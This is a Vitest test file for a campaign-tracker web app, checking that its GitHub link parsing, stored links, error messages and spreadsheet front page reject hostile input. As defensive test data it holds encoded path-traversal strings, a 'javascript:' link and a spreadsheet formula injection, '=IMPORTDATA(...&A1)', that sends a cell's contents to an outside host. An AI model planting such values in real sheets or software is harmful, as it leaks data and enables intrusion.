import { describe, expect, it } from "vitest";
import { readTrackerState } from "@/components/common/tracker-state";
import { parseGithubUrl } from "@/lib/import/github-sets";
import { fetchTrackerLayout } from "@/lib/import/tracker-layout";
import { userMessage } from "@/lib/utils/user-message";
import { frontPageRequests } from "@/lib/sync/sheet-view";
import { battleParticipantInlineSchema } from "@/lib/schemas/crusade";

describe("tracker state read from a shared sheet", () => {
  it("keeps only items that are what they claim to be", () => {
    const state = readTrackerState({
      items: [
        null,
        "text",
        { id: "a", name: "Points", kind: "counter", value: 3 },
        { id: "b", name: "Lies", kind: "counter", value: "three" },
        { id: "c", name: "List", kind: "list", value: 5 },
      ],
    });
    expect(state.items.map((i) => i.id)).toEqual(["a"]);
  });
});

describe("GitHub links", () => {
  it("accepts a repository or folder link", () => {
    expect(parseGithubUrl("https://github.com/someone/sets/tree/main/factions")).toEqual({
      owner: "someone", repo: "sets", ref: "main", path: "factions",
    });
  });
  it("refuses links that step outside the repository or are malformed", () => {
    // The browser's own link parser folds ".." away before we see it.
    expect(parseGithubUrl("https://github.com/a/b/tree/x/%2e%2e/%2e%2e/users")?.path ?? "").not.toMatch(/\.\./);
    expect(parseGithubUrl("https://github.com/a/b/tree/x/..%5C..%5Cusers")).toBeNull();
    expect(parseGithubUrl("https://github.com/a/b/tree/x/%zz")).toBeNull();
    expect(parseGithubUrl("https://github.com/a%2Fb/c")).toBeNull();
    expect(parseGithubUrl("https://example.com/a/b")).toBeNull();
  });
  it("only fetches single sets from GitHub's file hosts", async () => {
    await expect(fetchTrackerLayout("https://example.com/set.json")).rejects.toThrow(/GitHub/);
    await expect(fetchTrackerLayout("http://raw.githubusercontent.com/a/b/main/s.json")).rejects.toThrow(/GitHub/);
  });
});

describe("links stored on a battle", () => {
  it("drops anything that is not a web address", () => {
    const base = { googleId: "g", displayName: "P", rosterId: "r" };
    expect(battleParticipantInlineSchema.parse({ ...base, logUrl: "javascript:alert(1)" }).logUrl).toBeUndefined();
    expect(battleParticipantInlineSchema.parse({ ...base, logUrl: "https://example.com/log" }).logUrl).toBe(
      "https://example.com/log",
    );
  });
});

describe("messages shown to people", () => {
  it("never shows a validation dump or a raw object", () => {
    const zodLike = Object.assign(new Error('[{"code":"too_big","path":["name"]}]'), { name: "ZodError" });
    expect(userMessage(zodLike)).not.toMatch(/too_big|\[\{/);
    expect(userMessage(new Error('{"error":{"code":429}}'))).not.toMatch(/\{/);
    expect(userMessage({ odd: true })).toMatch(/went wrong/i);
    expect(userMessage(new Error("Pick who you played against."))).toBe("Pick who you played against.");
  });
});

describe("the sheet's front page", () => {
  it("never writes text typed by a player as a formula", () => {
    const now = "2026-11-18T12:00:00.000Z";
    const evil = '=IMPORTDATA("https://example.com/?"&A1)';
    const gm = { googleId: "g", email: "gm@example.com", displayName: evil };
    const requests = frontPageRequests({
      crusade: {
        id: "s", name: evil, packId: "core", createdAt: now, createdBy: gm,
        supplyLimit: 1000, startingRP: 5,
        settings: { allowPlayerBattleCreation: true },
        players: [{ user: gm, factionName: "", joinedAt: now, role: "gm", status: "Active", tabId: 10 }],
        attachedRosters: [], gmAssignments: [], battles: [],
        packContent: { agendas: [], missions: [], relics: [] },
        packState: {
          counters: [],
          items: [{ id: "t", name: evil, kind: "text", value: evil }],
          note: evil,
        },
        trackerSets: [], phases: [],
      } as never,
      titles: new Map([[10, "data"]]),
      gmEmail: gm.email,
      existing: new Set([10]),
    });
    const formulas = JSON.stringify(requests).match(/"formulaValue":"[^"]*/g) ?? [];
    expect(formulas.filter((f) => /IMPORTDATA/.test(f) && !/HYPERLINK/.test(f))).toEqual([]);
    for (const f of formulas) expect(f.startsWith('"formulaValue":"=IMPORTDATA')).toBe(false);
  });
});
